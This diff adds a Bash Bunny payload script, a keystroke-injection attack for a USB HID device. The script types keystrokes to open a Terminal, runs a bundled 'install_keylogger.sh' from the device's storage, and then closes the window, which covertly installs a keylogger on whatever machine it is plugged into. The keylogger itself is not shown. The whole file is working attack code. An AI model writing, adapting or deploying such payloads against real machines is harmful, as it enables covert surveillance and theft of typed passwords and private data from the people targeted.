@@ -1,0 +1,18 @@
+SWITCH=switch1
+
+ATTACKMODE HID STORAGE
+
+LED B 100
+# Open a terminal
+QUACK GUI
+QUACK DELAY 500
+QUACK STRING Terminal
+QUACK ENTER
+QUACK DELAY 1000
+QUACK STRING bash "/media/bbpwn2/BashBunny/payloads/switch1/install_keylogger.sh" 
+QUACK ENTER
+QUACK DELAY 5000
+QUACK STRING exit
+QUACK ENTER
+
+LED R G 100
